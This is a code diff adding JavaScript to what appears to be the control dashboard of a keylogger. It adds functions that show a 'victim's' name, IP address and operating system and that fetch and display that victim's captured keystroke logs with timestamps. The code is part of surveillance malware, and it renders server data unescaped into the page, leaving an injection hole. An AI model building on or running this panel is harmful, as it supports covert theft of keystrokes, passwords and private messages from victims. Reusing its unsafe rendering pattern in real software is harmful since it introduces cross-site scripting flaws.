@@ -32,3 +32,53 @@ let displayVictims = ()=>{
         $("#victim_container").html(html)
     })
 }
+
+//Dashboard data loading
+let createDashboard = ()=>{
+    let UUID = location.search.split('UUID=')[1]
+    $.get(`/victim/${UUID}`, (data)=>{   
+        $("#v_name").html(data.data[0].name)
+        $("#v_UUID").html(data.data[0].UUID)
+        $("#v_IP").html(data.data[0].IP)
+        $("#v_OS").html(data.data[0].OS)
+        $("#keylog_btn").attr("href",`./keylogs.html?UUID=${UUID}`)
+    })
+    .fail(()=>{
+        alert(`Victim with ${UUID} not found!`)
+        window.location.replace("/web")
+    })
+}
+
+//Fetching Keylogs
+let fetchKeylogs = ()=>{
+    let UUID = location.search.split('UUID=')[1]
+
+    $.get(`/victim/${UUID}`, (data)=>{   
+        $("#v_name").html(data.data[0].name)
+        $("#v_UUID").html(data.data[0].UUID)
+    })
+    .fail(()=>{
+        alert(`Victim with ${UUID} not found!`)
+        window.location.replace("/web")
+    })
+
+    $.get( `/victim/${UUID}/keylogs`,(data)=>{
+        console.log("I am here!")
+        console.log(data)
+        html = ""
+        data.data.forEach(element => {
+            html += 
+            `<div class="row mb-4">
+                <div class="col">
+                    <div class="keylogs">
+                        <h6>${element.timeStamp}</h6>
+                        <p>${element.logs}</p>
+                        <img src="../resources/images/window-logo.png" class="img-fluid img-logs" alt="">
+                    </div>
+                </div>
+            </div>`
+        });
+
+        $("#keylogs_data").html(html)
+    })
+}
